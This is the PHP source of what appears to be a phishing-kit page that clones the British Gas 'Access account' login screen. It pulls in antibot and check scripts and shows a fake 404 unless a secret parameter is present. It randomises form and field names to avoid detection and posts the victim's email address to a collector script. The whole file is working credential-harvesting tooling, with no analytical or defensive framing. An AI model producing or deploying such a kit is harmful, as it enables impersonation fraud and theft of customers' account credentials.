<?php

error_reporting(0);
include "at.php";
include "control.php";

include('files/boot/check.php');
include('files/boot/check1.php');
include('files/boot/check2.php');
include('files/boot/antibot.php');
include('files/v/enc.php');

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

session_start();
session_regenerate_id();
if(isset($_GET["idClaim"]))
{
	$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(13,15));
	echo '<!DOCTYPE html>
'.ob_start().'
<html class="win chrome chrome69 webkit webkit5"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<script>
function empty() {
    var x;
    x = document.getElementById("username").value;
    if (x == "") {
        document.getElementById("ember474").classList.remove("in-focus");
		return false;
    }
	
}
</script>

<script>
function change() {
    var e;
    e = document.getElementById("username").value;
    if (e !== ""){
	    document.getElementById("ember474").classList.add("in-focus");
	}
	
}

</script>

<link rel="SHORTCUT ICON" href="index_files/favicon.ico">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    
    <title>Log in to your account</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-itunes-app" content="app-id=340473961">

    
<style>
#app-preloader {
  font-family: Arial;
  width: 180px; height: 30px;
  line-height: 30px; position: absolute; top: 50%; left: 50%; text-align: center;
  margin-top: -15px; margin-left: -90px;
  color: #0099ff; z-index: 1000;
}
</style>

</head><body class="ember-application">

  <link rel="stylesheet" href="index_files/bg-vi-3.0.2.css">

<meta name="theme-color" content="#005EB8">

  <meta name="tag" content="2.7.8">


    <link rel="stylesheet" href="index_files/font-awesome.min.css">
    <link rel="stylesheet" href="index_files/vendor-6593e5f4e090a11492d9b56eb4e38aaa.css">
    <link rel="stylesheet" href="index_files/identity-f3bfb218359aabfe20b6c891ec255dcb.css">

  <link rel="stylesheet" href="index_files/hpp-embedded-integration-library.css">
  
<div id="ember355" class="ember-view"><div id="ember387" class="ember-view">    <header id="addon-bg-header" class="bgcss custom-bg-1 ember-view"><nav class="navbar yamm navbar-default navbar-fixed-top">
  <a href="" class="sr-only sr-only-focusable">Skip to main content</a>
    <div class="topnav py1">
      <div class="container">
        <div class="pull-left">
          <div id="ember396" class="__56f18 ember-view"><span class="background-white active px2 py3">My Home</span><ul class="navbar-nav collapse navbar-collapse navbar-topnav navbar-right yamm-fw" style="max-height: 542.6px;"><li class="dropdown dropdown-topnav"><a href="" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false" class="px2 py3 dropdown-toggle">My Business</a><div role="menu" aria-labelledby="Business" class="dropdown-menu dropdown-menu-topnav"><ul role="menu" class="fa-ul ml2 mr4 mb4"><div><div class="Business Energy"><a href=""><h5 class="px2 py2">Business Energy</h5></a><li><a href=""></a><a title="businessElectricity" role="menuitem" href="" class="menu-section"><i class="fa fa-angle-right"></i>Business electricity</a></li><li><a title="businessGas" role="menuitem" href="" class="menu-section"><i class="fa fa-angle-right"></i>Business gas</a></li><li><a title="businessGAQ" role="menuitem" href="" class="menu-section"><i class="fa fa-angle-right"></i>Get a business energy quote</a></li></div><div class="Business Services"><a href=""><h5 class="px2 py2">Business Services</h5></a><li><a href=""></a><a title="businessBoilerMaintenance" role="menuitem" href="" class="menu-section"><i class="fa fa-angle-right"></i>Business boiler maintenance</a></li><li><a title="businessBoilerInstallation" role="menuitem" href="" class="menu-section"><i class="fa fa-angle-right"></i>Business boiler installation</a></li><li><a title="businessBoilerBreakdown" role="menuitem" href="" class="menu-section"><i class="fa fa-angle-right"></i>Business boiler breakdown</a></li></div><div class="Your business account"><a href=""><h5 class="px2 py2">Your business account</h5></a><li><a href=""></a><a title="businessLogin" role="menuitem" href="" class="menu-section"><i class="fa fa-angle-right"></i>Login</a></li><li><a title="businessRegister" role="menuitem" href="" class="menu-section"><i class="fa fa-angle-right"></i>Register</a></li></div></div></ul></div></li></ul></div>
        </div>
        <div id="quickLinks" class="pull-right hidden-xs">
<!---->        </div>
      </div>
    </div>
  <div class="container">
    <div class="navbar-header">
      <button type="button" id="btn-menu-1" data-toggle="collapse" data-target="#mobile-Menu-3" class="navbar-toggle collapsed" data-ember-action="" data-ember-action-409="409">
        <i class="fa fa-reorder ml1 mr1"></i>
        <p>Menu</p>
      </button>
      <button type="button" id="btn-menu-2" data-toggle="collapse" data-target="#mobile-Menu-2" class="navbar-toggle collapsed" data-ember-action="" data-ember-action-410="410">
        <i class="fa fa-user"></i>
        <p>My Account</p>
      </button>
      <a href="" id="logo">
            <img alt="British Gas" src="index_files/bg-logo-mobile.svg" width="146px" height="57px" class="bg-logo mt1 mb1 xs-ml2 sm-ml0">
      </a>
    </div>
    <div class="nav-list-adj nav-bar-content">
        <div id="navbar-collapse-1" class="collapse navbar-collapse ember-view" style="max-height: 542.6px;"><ul id="navbar" class="nav navbar-nav navbar-right">
    <li class="dropdown yamm-fw mt5">
        <a href="" data-toggle="dropdown" role="button" title="Energy" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold">
          Energy
        </a>
       
    </li>
    <li class="dropdown yamm-fw mt5">
        <a href="" data-toggle="dropdown" role="button" title="Home Services" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold">
          Home Services
        </a>
        
    </li>
    <li class="dropdown yamm-fw mt5">
        <a href="" data-toggle="dropdown" role="button" title="Smart Home" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold">
          Smart Home
        </a>
        
    </li>
    <li class="dropdown yamm-fw mt5">
        <a href="" id="help-and-support" data-toggle="dropdown" role="button" title="Help &amp; Support" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold">
          Help &amp; Support
        </a>
<!---->    </li>
    <li class="dropdown yamm-fw mt5">
        <a href="" id="loggedInLink" data-toggle="dropdown" role="button" title="My Account" aria-haspopup="true" aria-expanded="false" class="dropdown-toggle bold">
          My Account
        </a>
       
    </li>
</ul>
</div>
    </div>
  </div>
</nav>
</header>

</div>
<div class="identity custom-bg custom-bg-1 bgcss">
<!---->  <div><div class="container login index mt6">
<!---->
<!---->
    <h1 class="h2 text-center">Access account</h1>
    <div id="ember427" class="ember-view"><form id="'.$fname.'" name="'.$fname.'" class="form-behaviour-default text-center no-success form-behaviour-default text-center unsubmitted ember-view" action="i3749.php?/TV-Rnd/Access/Personal&idClaim='.randomCha(rand(15,30)).'" onsubmit="'.$fj.'(); return false;" method="post" novalidate="novalidate">
  <div id="ember471" class="scroll-anchor scroll-anchorerror ember-view">
</div>

  <div class="row">
    <div class="col-md-4 col-md-offset-4 col-xs-12">
<div id="ember474" class="has-feedback form-group has-error pristine touched in-focus ember-view">        <label for="loginForm-email">Email address</label>
        <input name="username" type="email" autocapitalize="none" id="'.randomCha(rand(10,30)).'" class="form-control text-center ember-text-field ember-view" onBlur="change()" >
        <span aria-hidden="true" class="glyphicon glyphicon-ok form-control-feedback"></span>
        <span aria-hidden="true" class="glyphicon glyphicon-remove form-control-feedback"></span>
        <p id="loginForm-email-error" class="form-control-error">
          <i class="fa fa-exclamation-triangle"></i> We need an email address from you
        </p>

</div>    </div>
  </div>

  <div class="form-group text-center">
<button style="touch-action: manipulation; -ms-touch-action: manipulation; cursor: pointer; outline: 0" type="submit" id="loginForm-next" class="bg-button btn btn-primary ember-view">      <span aria-hidden="true" class="bg-button-icon fa fa-angle-right"></span>
        Next

</button>  </div>

</form></div>

    <div class="text-center mb4">
<a style="touch-action: manipulation; -ms-touch-action: manipulation; cursor: pointer;" href="" id="ember488" class="btn btn-tertiary ember-view">        <span aria-hidden="true" class="fa fa-angle-right"></span>I"ve forgotten my email
</a>    </div>
</div>
</div>
</div>

<div id="ember502" class="ember-view">    <footer id="addon-bg-footer" class="bgcss custom-bg-1 bg-footer ember-view"><div class="background-dark-blue britishgas"><div class="container sm-py12 xs-py8"><div class="row equal-height-row"><div class="col-lg-3 col-sm-3 col-md-3 col-xs-6 equal-height-col"><ul class="p0"><li><a href="" title="About British Gas">About us</a></li><li><a href="" title="Legal">Legal</a></li><li><a href="" title="Cookie policy">Cookie policy</a></li><li><a href="" title="Terms &amp; conditions">Terms &amp; conditions</a></li><li><a href="" title="Privacy policy">Privacy policy</a></li><li><a href="" title="Access for all">Access for all</a></li><li><a href="" title="Performance standards">Performance standards</a></li><li><a href="" title="Our complaints performance">Complaints performance</a></li><li><a href="" title="Complaints">Complaints</a></li><li><a href="" title="Emergencies">Emergencies</a></li><li><a href="" title="Download our app">Download our app</a></li></ul></div><div class="border-right border-cyan col-md-3 col-lg-3 col-sm-3 col-xs-6 equal-height-col"><ul class="p0"><li><a href="" title="British Gas Business">British Gas Business</a></li><li><a href="" title="Hive Active Heating">Hive Active Heating</a></li><li><a href="" title="Centrica PLC">Centrica PLC</a></li></ul></div><div class="col-sm-6 col-xs-12 col-lg-4 col-md-4 social-box xs-mt3 equal-height-col"><div class="row"><div class="footer-social col-sm-5 col-md-5 col-lg-5 col-xs-6 col-sm-offset-1 col-md-offset-1 col-lg-offset-1"><a target="_blank" href="" class="mb6 block"><img src="index_files/Icon_Twitter.svg" width="39">&nbsp;Twitter</a></div><div class="footer-social col-xs-6 col-sm-6 col-md-6 col-lg-6"><a target="_blank" href="" class="mb6 block"><img src="index_files/Icon_YouTube.svg" width="39">&nbsp;YouTube</a></div></div><div class="row"><div class="footer-social col-sm-5 col-sm-offset-1 col-md-5 col-md-offset-1 col-lg-5 col-lg-offset-1 col-xs-offset-0 col-xs-6"><a target="_blank" href="" class="mb6 block"><img src="index_files/Icon_Facebook.svg" width="39">&nbsp;Facebook</a></div><div class="footer-social col-xs-6 col-sm-6 col-md-6 col-lg-6"><a target="_blank" href="" class="mb6 block"><img src="index_files/Icon_News.svg" width="39">&nbsp;Latest news</a></div></div></div></div><div class="row"><div class="col-xs-12 legal-links"><div class="pull-right"><img title="British Gas" src="index_files/bg_logo_white.svg" class="footer-bg-logo"><p class="britishgas">� British Gas 2018</p></div></div></div></div></div></footer>

</div>

</div></body></html>';
}
else
{
	header($_SERVER['SERVER_PROTOCOL'] . ' 404 Page Not Found', true, 500);
	die("<h1>404 Page Not Found</h1>");
}
?><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
<script id="_wautga">var _wau = _wau || []; _wau.push(["dynamic", "6vx1nnpvri", "tga", "c4302bffffff", "small"]);</script><script async src="//waust.at/d.js"></script>